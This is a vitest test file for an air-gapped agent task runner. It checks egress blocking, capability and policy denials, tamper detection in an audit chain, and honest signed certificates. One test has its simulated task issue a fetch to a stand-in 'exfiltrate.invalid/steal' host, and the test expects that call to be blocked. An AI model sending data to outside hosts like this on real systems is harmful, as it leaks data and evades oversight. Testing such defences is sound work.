import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { runAirgappedTask, formatAirgapRunReport, AirgapViolationError, type AirgappedTaskContext } from "../airgap-run";
import { GovIdentity, govCanonicalize } from "../identity";
import { govRoot, GovKeystore } from "../keystore";
import { GovAuditChain } from "../audit-chain";
import { verifyCertificate } from "../../styx/certificate";

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "gov-airgap-run-test-"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function fixedClock(t: number): () => number {
  let now = t;
  return () => now++;
}

// ---------------------------------------------------------------------------
// THE PHASE CHECKPOINT
// ---------------------------------------------------------------------------

describe("runAirgappedTask — the phase checkpoint", () => {
  it("a real task, air-gapped, blocked+audited egress attempt, denied over-privileged capability, still produces a real verified certificate", async () => {
    const identity = GovIdentity.generate();

    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(1_000_000),
      task: {
        id: "phase-checkpoint-task",
        prompt: "attempt exfiltration, expect it blocked; attempt an over-privileged capability, expect denial",
        run: async (ctx: AirgappedTaskContext) => {
          // A legitimately-granted capability request succeeds.
          const legit = ctx.authorize({
            subject: identity.agentId(),
            action: "tool:invoke",
            resource: "tool:echo",
            at: 1_000_010,
          });
          expect(legit.allow).toBe(true);

          // A real global fetch call is genuinely intercepted, before any I/O.
          let blocked = false;
          try {
            await fetch("https://exfiltrate.invalid/steal");
          } catch (err) {
            blocked = err instanceof AirgapViolationError;
          }

          // A deliberately over-privileged capability request (network egress,
          // never granted to this task's root token) is denied with a typed code.
          const overPrivileged = ctx.authorize({
            subject: identity.agentId(),
            action: "net:egress",
            resource: "net:exfiltrate.invalid",
            at: 1_000_020,
          });
          expect(overPrivileged.allow).toBe(false);

          ctx.audit({
            at: 1_000_030,
            actor: identity.agentId(),
            action: "task.note",
            resource: "phase-checkpoint",
            outcome: "info",
            payload: { blocked, deniedCode: overPrivileged.code },
          });

          return `blocked=${blocked} denied-code=${overPrivileged.code}`;
        },
      },
    });

    expect(result.ok).toBe(true);
    expect(result.output).toContain("blocked=true");
    expect(result.verified).toBe(true);

    // real air-gap actually sealed
    expect(result.airgap.sealed).toBe(true);
    expect(result.egressAttempts.length).toBeGreaterThan(0);
    expect(result.egressAttempts.some((a) => a.blocked && a.seam === "fetch")).toBe(true);

    // real, typed capability denial surfaced
    expect(result.denials).toHaveLength(1);
    expect(result.denials[0].allow).toBe(false);
    expect(typeof result.denials[0].code).toBe("string");
    expect(result.denials[0].code).not.toBe("allow");

    // real audit chain, verified from its own bytes
    expect(result.audit.ok).toBe(true);
    expect(result.audit.entries).toBeGreaterThan(0);

    // real ed25519 certificate, independently re-verified
    expect(result.certificate).toBeDefined();
    expect(result.certificateValid).toBe(true);
    const independentlyVerified = await verifyCertificate(result.certificate!);
    expect(independentlyVerified).toBe(true);

    // real signed checkpoint over the real chain
    expect(result.checkpoint.treeSize).toBe(result.audit.entries);
    expect(result.checkpoint.signerPublicKey).toBe(identity.publicKeyHex());

    // formatAirgapRunReport renders plain ASCII lines mentioning the key facts
    const rendered = formatAirgapRunReport(result);
    expect(rendered.some((l) => l.includes("VERIFIED"))).toBe(true);
    expect(rendered.some((l) => l.includes("blocked"))).toBe(true);
  });

  it("uses ZERO real network — the certificate's signature is checked by real ed25519, not simulated", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(2_000_000),
      task: { id: "no-net", prompt: "no network is used by this test itself", run: async () => "ok" },
    });
    expect(result.ok).toBe(true);
    expect(result.certificate).toBeDefined();
    // Tamper the signature and confirm the REAL verifier rejects it — proves
    // this is a genuine cryptographic check, not a stubbed boolean.
    const tampered = { ...result.certificate!, signature: "00".repeat(64) };
    expect(await verifyCertificate(tampered)).toBe(false);
    expect(await verifyCertificate(result.certificate!)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Tamper-evidence on the ACTUAL on-disk audit artifact
// ---------------------------------------------------------------------------

describe("runAirgappedTask — tamper-evidence on the real on-disk audit chain", () => {
  it("mutating one byte of the on-disk audit segment is caught on re-verify, with the exact broken seq", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(3_000_000),
      task: {
        id: "tamper-target",
        prompt: "produce several audit entries",
        run: async (ctx) => {
          ctx.audit({ at: 3_000_001, actor: identity.agentId(), action: "note", resource: "a", outcome: "info" });
          ctx.audit({ at: 3_000_002, actor: identity.agentId(), action: "note", resource: "b", outcome: "info" });
          return "done";
        },
      },
    });
    expect(result.audit.ok).toBe(true);
    expect(result.audit.entries).toBeGreaterThan(2);

    const segPath = join(govRoot(dir), "audit", "seg-000000.jsonl");
    expect(existsSync(segPath)).toBe(true);
    const raw = readFileSync(segPath, "utf8");

    // Flip a single byte deep inside the second line's payload hash — this
    // keeps the JSON well-formed (so it's a HASH mismatch, not a parse
    // failure) and targets a specific, known seq.
    const lines = raw.split("\n").filter((l) => l.length > 0);
    expect(lines.length).toBeGreaterThan(1);
    const targetIndex = 1;
    const targetEntry = JSON.parse(lines[targetIndex]) as { payloadSha256: string; seq: number };
    const flippedChar = targetEntry.payloadSha256[0] === "a" ? "b" : "a";
    const tamperedEntry = { ...targetEntry, payloadSha256: flippedChar + targetEntry.payloadSha256.slice(1) };
    lines[targetIndex] = JSON.stringify(tamperedEntry);
    writeFileSync(segPath, lines.join("\n") + "\n", "utf8");

    const reopened = GovAuditChain.open({ dir: govRoot(dir), verifyOnOpen: false });
    const reverified = reopened.verify();
    expect(reverified.ok).toBe(false);
    expect(reverified.failures[0].code).toBe("hash-mismatch");
    expect(reverified.failures[0].seq).toBe(targetEntry.seq);
    expect(reverified.brokenAt).toBe(targetEntry.seq);
  });
});

// ---------------------------------------------------------------------------
// Failure paths
// ---------------------------------------------------------------------------

describe("runAirgappedTask — failure paths", () => {
  it("refuses to start when the pre-existing audit chain is tampered", async () => {
    const identity = GovIdentity.generate();
    await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(4_000_000),
      task: { id: "seed", prompt: "seed the chain", run: async () => "seeded" },
    });

    const segPath = join(govRoot(dir), "audit", "seg-000000.jsonl");
    const raw = readFileSync(segPath, "utf8");
    const lines = raw.split("\n").filter((l) => l.length > 0);
    const entry = JSON.parse(lines[0]) as { entrySha256: string };
    lines[0] = JSON.stringify({ ...entry, entrySha256: "0".repeat(64) });
    writeFileSync(segPath, lines.join("\n") + "\n", "utf8");

    await expect(
      runAirgappedTask({
        dataDir: dir,
        identity,
        now: fixedClock(4_100_000),
        task: { id: "second-run", prompt: "should never start", run: async () => "unreachable" },
      }),
    ).rejects.toThrow(/refusing to start/i);
  });

  it("an identity whose keystore is corrupt aborts loudly", async () => {
    const ksDir = govRoot(dir);
    const identityPath = join(ksDir, "identity.json");
    mkdirSync(ksDir, { recursive: true });
    writeFileSync(identityPath, "{ this is not valid json at all", "utf8");

    await expect(
      runAirgappedTask({
        dataDir: dir,
        now: fixedClock(5_000_000),
        task: { id: "unreachable", prompt: "never runs", run: async () => "unreachable" },
      }),
    ).rejects.toThrow();
  });

  it("a fail-closed (broken, non-absent) policy denies everything and the result reports verified:false honestly", async () => {
    const identity = GovIdentity.generate();
    const policyDir = join(govRoot(dir), "policy");
    mkdirSync(policyDir, { recursive: true });

    // Valid JSON, well-formed doc, but signed by a DIFFERENT key than the
    // identity this run trusts — an untrusted-signer bundle, not an absent
    // one, so the auto-bootstrap path must NOT kick in.
    const impostor = GovIdentity.generate();
    const doc = {
      schema: "hades.gov.policy.v1" as const,
      name: "impostor",
      version: 1,
      defaultEffect: "deny" as const,
      rules: [],
    };
    const canonical = govCanonicalize(doc);
    const bundle = {
      doc,
      signature: impostor.sign(canonical),
      signerPublicKey: impostor.publicKeyHex(),
      docSha256: "irrelevant-for-this-test",
    };
    writeFileSync(join(policyDir, "policy.json"), JSON.stringify(bundle, null, 2), "utf8");

    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(6_000_000),
      task: {
        id: "policy-broken",
        prompt: "everything should be denied",
        run: async (ctx) => {
          const decision = ctx.authorize({
            subject: identity.agentId(),
            action: "invoke",
            resource: "tool:echo",
            at: 6_000_010,
          });
          return decision.allow ? "unexpectedly-allowed" : `denied:${decision.code}`;
        },
      },
    });

    expect(result.ok).toBe(true);
    expect(result.output).toMatch(/^denied:/);
    // an honest, non-fabricated failure: the certificate's signature can
    // still be genuinely valid (real crypto), but the overall verified
    // verdict must be false because the policy layer that gated every
    // decision never loaded "ok".
    expect(result.verified).toBe(false);
    expect(result.certificateValid).toBe(true);
    expect(result.audit.ok).toBe(true);
  });

  it("a deny-all policy denies a capability request that WOULD otherwise have been granted", async () => {
    const identity = GovIdentity.generate();
    const policyDir = join(govRoot(dir), "policy");
    mkdirSync(policyDir, { recursive: true });
    writeFileSync(join(policyDir, "policy.json"), "not even json", "utf8");

    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(7_000_000),
      task: {
        id: "malformed-policy",
        prompt: "capability alone would allow this, policy must still deny it",
        run: async (ctx) => {
          const decision = ctx.authorize({
            subject: identity.agentId(),
            action: "tool:invoke",
            resource: "tool:echo",
            at: 7_000_010,
          });
          return JSON.stringify(decision);
        },
      },
    });
    expect(result.verified).toBe(false);
    const decision = JSON.parse(result.output) as { allow: boolean; code: string };
    expect(decision.allow).toBe(false);
    // proves the CAPABILITY layer alone would have allowed this (its grant
    // covers tool:invoke on tool:*) — the denial genuinely came from the
    // independent policy layer refusing to load, not from a missing grant.
    expect(decision.code).toBe("caveat-failed");
  });
});

// ---------------------------------------------------------------------------
// Composition details
// ---------------------------------------------------------------------------

describe("runAirgappedTask — composition details", () => {
  it("resolves identity from a real GovKeystore when none is injected", async () => {
    const result = await runAirgappedTask({
      dataDir: dir,
      now: fixedClock(8_000_000),
      task: { id: "resolved-identity", prompt: "p", run: async () => "ok" },
    });
    expect(result.ok).toBe(true);
    const ks = GovKeystore.open({ dir: govRoot(dir) });
    const loaded = ks.load();
    expect(loaded.source).toBe("persisted");
    expect(result.checkpoint.signerPublicKey).toBe(loaded.identity.publicKeyHex());
  });

  it("a task that throws is reported ok:false, verified:false, with no certificate", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(9_000_000),
      task: {
        id: "throws",
        prompt: "boom",
        run: async () => {
          throw new Error("task exploded");
        },
      },
    });
    expect(result.ok).toBe(false);
    expect(result.verified).toBe(false);
    expect(result.certificate).toBeUndefined();
    expect(result.certificateValid).toBe(false);
    expect(result.audit.ok).toBe(true);
  });

  it("respects a caller-supplied AirgapPolicy (e.g. loopback allowed)", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(10_000_000),
      policy: { allowLoopback: true },
      task: {
        id: "loopback-ok",
        prompt: "loopback should pass through, not be blocked",
        run: async () => {
          let threw = false;
          try {
            await fetch("http://127.0.0.1:1/definitely-not-listening").catch((e) => {
              // A connection error from actually dialing an unlistened
              // loopback port is expected and fine; only re-throw an
              // AirgapViolationError to distinguish from a real attempt.
              if (e instanceof AirgapViolationError) throw e;
            });
          } catch (err) {
            threw = err instanceof AirgapViolationError;
          }
          return threw ? "blocked" : "allowed-through";
        },
      },
    });
    expect(result.ok).toBe(true);
    expect(result.output).toBe("allowed-through");
    expect(result.egressAttempts.some((a) => !a.blocked && a.seam === "fetch")).toBe(true);
  });

  it("audit trail records both blocked and allowed egress attempts distinctly", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(11_000_000),
      task: {
        id: "mixed-attempts",
        prompt: "one blocked, one allowed",
        run: async () => {
          try {
            await fetch("https://blocked.invalid");
          } catch {
            /* expected */
          }
          return "ok";
        },
      },
    });
    expect(result.egressAttempts.some((a) => a.blocked && a.target === "https://blocked.invalid")).toBe(true);
    const chain = GovAuditChain.open({ dir: govRoot(dir) });
    const blockedEntries = chain.entries({ action: "airgap.egress.blocked" });
    expect(blockedEntries.length).toBeGreaterThan(0);
  });

  it("formatAirgapRunReport lists denials and unverifiable seams when present", async () => {
    const identity = GovIdentity.generate();
    const result = await runAirgappedTask({
      dataDir: dir,
      identity,
      now: fixedClock(12_000_000),
      task: {
        id: "with-denial",
        prompt: "trigger one denial",
        run: async (ctx) => {
          ctx.authorize({ subject: identity.agentId(), action: "egress", resource: "net:x.invalid", at: 12_000_010 });
          return "ok";
        },
      },
    });
    const rendered = formatAirgapRunReport(result);
    expect(rendered.some((l) => l === "DENIALS")).toBe(true);
    expect(rendered.some((l) => l.includes("["))).toBe(true);
  });

  it("rejects an empty dataDir or a malformed task", async () => {
    await expect(
      runAirgappedTask({ dataDir: "", task: { id: "x", prompt: "x", run: async () => "x" } }),
    ).rejects.toThrow(RangeError);
    await expect(
      runAirgappedTask({ dataDir: dir, task: { id: "", prompt: "x", run: async () => "x" } }),
    ).rejects.toThrow(RangeError);
  });
});


// ---------------------------------------------------------------------------
// Certificate honesty — `pCorrect`/`ensembleScore` are DEFINED by
// ../styx/certificate as calibrated quantities. This run has no calibration,
// so it may only ever put a deterministic T0 verdict (exactly 1 or 0) there.
// ---------------------------------------------------------------------------

describe("runAirgappedTask — the certificate never carries an uncalibrated number", () => {
  it("a fully-verified run certifies pCorrect/ensembleScore of exactly 1, independent of the allow-rate", async () => {
    const dataDir = mkdtempSync(join(tmpdir(), "gov-cert-honesty-"));
    try {
      let denied = 0;
      const result = await runAirgappedTask({
        dataDir,
        task: {
          id: "cert-honesty",
          prompt: "make several authorization calls, most of which are denied",
          run: async (ctx) => {
            // Deliberately drive the allow-rate far away from 1 so that a
            // certificate echoing the allow-rate would be visibly different
            // from a certificate carrying a deterministic verdict.
            for (const action of ["net:egress", "net:egress", "net:egress"]) {
              const d = ctx.authorize({ subject: "unused", action, resource: "net:example.com", at: 5 });
              if (!d.allow) denied++;
            }
            return "done";
          },
        },
      });

      expect(result.ok).toBe(true);
      expect(result.verified).toBe(true);
      expect(denied).toBe(3);
      // The measured allow-rate is 0 and is reported honestly, under a name
      // that says what it is...
      expect(result.authorizeAllowRate).toBe(0);
      // ...while the certificate carries the deterministic T0 verdict (1),
      // NOT the allow-rate. If these were ever wired together this assertion
      // is the one that breaks.
      expect(result.certificate?.payload.pCorrect).toBe(1);
      expect(result.certificate?.payload.ensembleScore).toBe(1);
      expect(result.certificate?.payload.epsilon).toBe(0);
      expect(result.certificate?.payload.verifierTier).toBe("T0-execution");
      // And it is a REAL ed25519 signature, re-verified by the real verifier.
      expect(result.certificateValid).toBe(true);
      expect(await verifyCertificate(result.certificate!)).toBe(true);
    } finally {
      rmSync(dataDir, { recursive: true, force: true });
    }
  });

  it("a run whose policy fails closed certifies a deterministic 0, not a passing-looking score", async () => {
    const dataDir = mkdtempSync(join(tmpdir(), "gov-cert-honesty-fail-"));
    try {
      // Plant a present-but-unsigned policy: PolicyStore fails CLOSED, so the
      // deterministic verdict is false even though the task itself completes.
      const policyDir = join(govRoot(dataDir), "policy");
      mkdirSync(policyDir, { recursive: true });
      writeFileSync(
        join(policyDir, "policy.json"),
        JSON.stringify({ doc: { schema: "hades.gov.policy.v1", name: "planted", version: 1, defaultEffect: "deny", rules: [] } }),
        "utf8",
      );

      const result = await runAirgappedTask({
        dataDir,
        task: { id: "cert-honesty-fail", prompt: "complete normally under a broken policy", run: async () => "done" },
      });

      expect(result.ok).toBe(true); // the task itself completed
      expect(result.verified).toBe(false); // but the run as a whole did NOT verify
      expect(result.certificate?.payload.pCorrect).toBe(0);
      expect(result.certificate?.payload.ensembleScore).toBe(0);
      // The signature is still real and still verifies — the certificate is
      // honestly signed, it just certifies a FAILING verdict.
      expect(result.certificateValid).toBe(true);
    } finally {
      rmSync(dataDir, { recursive: true, force: true });
    }
  });

  it("authorizeAllowRate is absent (never defaulted to 1) when the task made no authorization calls", async () => {
    const dataDir = mkdtempSync(join(tmpdir(), "gov-cert-honesty-none-"));
    try {
      const result = await runAirgappedTask({
        dataDir,
        task: { id: "no-authz", prompt: "no authorization calls at all", run: async () => "quiet" },
      });
      expect(result.authorizeAllowRate).toBeUndefined();
      expect(result.certificate?.payload.pCorrect).toBe(1);
    } finally {
      rmSync(dataDir, { recursive: true, force: true });
    }
  });
});
